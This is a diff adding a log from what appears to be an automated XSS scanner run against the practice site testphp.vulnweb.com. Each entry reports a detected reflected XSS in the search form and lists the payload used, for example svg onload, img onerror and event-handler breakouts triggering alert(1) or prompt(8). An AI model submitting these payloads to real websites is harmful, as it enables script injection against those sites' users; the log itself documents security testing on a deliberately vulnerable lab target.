@@ -1,0 +1,96 @@
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<image/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<img/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<image src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<img src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<image src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '</scrip</script>t><img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<svg onload=alert(1)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '"><svg onload=alert(1)//\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '"onmouseover=alert(1)//\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '"autofocus/onfocus=alert(1)//\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': "'-alert(1)-'\n"}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': "'-alert(1)//\n"}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': "\\'-alert(1)//\n"}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '</script><svg onload=alert(1)>\n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable onblur=alert(1)>lose focus! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x onclick=alert(1)>click this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x oncopy=alert(1)>copy this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x oncontextmenu=alert(1)>right click this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x oncut=alert(1)>copy this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x ondblclick=alert(1)>double click this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x ondrag=alert(1)>drag this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable onfocus=alert(1)>focus this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable oninput=alert(1)>input here! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable onkeydown=alert(1)>press any key! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable onkeypress=alert(1)>press any key! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x contenteditable onkeyup=alert(1)>press any key! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x onmousedown=alert(1)>click this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x onmousemove=alert(1)>hover this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x onmouseout=alert(1)>hover this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
+[+] XSS Detected on http://testphp.vulnweb.com/artists.php?artist=1
+[*] Form details:
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'searchFor', 'value': '<x onmouseover=alert(1)>hover this! \n'}, {'type': 'submit', 'name': 'goButton'}]}
